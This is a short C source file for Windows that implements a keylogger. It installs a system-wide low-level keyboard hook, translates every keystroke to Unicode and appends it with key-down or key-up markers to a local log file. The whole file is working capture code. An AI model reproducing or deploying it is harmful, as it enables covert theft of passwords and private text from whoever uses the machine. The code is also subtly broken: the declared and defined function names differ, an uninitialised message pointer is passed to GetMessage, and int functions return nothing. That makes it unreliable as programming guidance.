#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#define LOGFILE "logfile.txt"
#define DOWN 1
#define UP 0

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
int LogCharToFile(WCHAR *key, int state);

int main(void)
{
    HHOOK hookptr = SetWindowsHookExA(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
    LPMSG message;
    GetMessage(message, NULL, 0, 0); // to keep program alive

    UnhookWindowsHookEx(hookptr);
}

int LogUnicodeCharToFile(WCHAR *key, int state)
{
    FILE *file = fopen(LOGFILE, "a");

    if (state == DOWN)
    {
        fputs("[DOWN]  ::  ", file);
    }
    else if (state == UP)
    {
       
        fputs("[UP]    ::  ", file);
    }
    fclose(file);
    file = fopen(LOGFILE, "a, ccs=UTF-8");
    fwprintf(file, L"%s", key);
    fclose(file);

    file = fopen(LOGFILE, "a");
    fputs("\n", file);

    fflush(file);
    fclose(file);
}

LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{

    if (nCode < 0)
    {
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }

    else
    {
        PKBDLLHOOKSTRUCT KB_struct_pointer = (PKBDLLHOOKSTRUCT)lParam;
        BYTE state[256];
        GetKeyboardState(state); //  needs to be done for ToUnicode
                                 //  to work, even though parameter is supposed to be optional?

        WCHAR buf[10] = {0};
        int res = ToUnicode(KB_struct_pointer->vkCode, KB_struct_pointer->scanCode, state, buf, 10, 0);

        if (wParam == WM_KEYDOWN)
        {
            if (res == 1)
            {
                LogUnicodeCharToFile(buf, DOWN);
            }
        }
        else if (wParam == WM_KEYUP)
        {
            if (res == 1)
            {
                LogUnicodeCharToFile(buf, UP);
            }
        }
        return CallNextHookEx(NULL, nCode, wParam, lParam);
    }
}
